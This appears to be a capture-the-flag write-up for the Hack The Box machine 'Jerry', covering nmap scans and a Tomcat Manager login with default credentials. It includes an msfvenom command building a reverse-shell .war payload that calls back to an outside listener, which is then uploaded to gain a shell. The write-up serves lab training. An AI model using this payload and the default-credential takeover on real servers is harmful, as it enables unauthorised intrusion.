# [Jerry](https://app.hackthebox.com/machines/jerry)


```bash
nmap -p- --min-rate 10000 10.10.10.95 -Pn
```
![Alt text](img/image.png)


After knowing open ports (8080), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p8080 10.10.10.95 -Pn 
```

![Alt text](img/image-1.png)


After browsing the page, I go to default '/manager' endpoint of application where Tomcat Manager is located.

And I wrote default credentials for authentication.

![Alt text](img/image-2.png)

that's tomcat: s3cret


![Alt text](img/image-3.png)


Now, I need to create malicious `.war` file which gives me reverse shell via `msfvenom` command.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=1337 -f war > dr4ks.war
```

![Alt text](img/image-4.png)


I can learn my malicious `.jsp` file by typing `strings dr4ks.war`.

![Alt text](img/image-6.png)


That's 'ftfpqwjqaqg.jsp' file which is malicious and I need to browse this.


Let's upload this malicious `.war` file into application.

![Alt text](img/image-5.png)


Let's browse this malicious `.jsp` file.

![Alt text](img/image-7.png)


I got reverse shell from port (1337).

![Alt text](img/image-8.png)


I found flags located in this directory ' C:\Users\Administrator\Desktop\flags'

I read this file via by typing `type 2*`.


user.txt and root.txt

![Alt text](img/image-9.png)
